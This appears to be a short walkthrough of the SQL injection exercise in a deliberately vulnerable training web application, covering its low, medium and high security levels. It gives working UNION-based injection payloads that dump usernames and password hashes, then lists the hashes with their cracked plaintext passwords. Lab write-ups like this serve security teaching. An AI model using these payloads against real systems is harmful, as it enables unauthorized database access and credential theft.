# SQL Injection

Objective

There are 5 users in the database, with id's from 1 to 5. Your mission... to
steal their passwords via SQLi.

## low

First we try `' or 1=1;#` and the server sends us the first name and surname
of all users, which means there's a SQLI point after `'`.  
Use `UNION` instead to steal any two columns from the table, in this case `user` and `password`.

```sql
' UNION SELECT user, password FROM users;#
```

Then we get some users and their passwords in MD5 hex digest.  
Let's crack those digest with [cmd5](https://www.cmd5.com).

user|password(hash)|password
-|-|-
admin|`5f4dcc3b5aa765d61d8327deb882cf99`|password
gordonb|`e99a18c428cb38d5f260853678922e03`|abc123
1337|`8d3533d75ae2c3966d7e0d4fcc69216b`|charley
pablo|`0d107d09f5bbe40cade3de5c71e9e9b7`|letmein
smithy|`5f4dcc3b5aa765d61d8327deb882cf99`|password

## medium

In this level our single quote is filtered by `mysql_real_escape_string()`.  
However, POST param "id" is interpreted as an integer, thus creating a
SQLI point without escaping characters.

```sql
-1 UNION SELECT user, password FROM users;#
```

## high

Basically the same as low level, except that we're redirected to a new page to
submit our query.

```sql
' UNION SELECT user, password FROM users;#
```
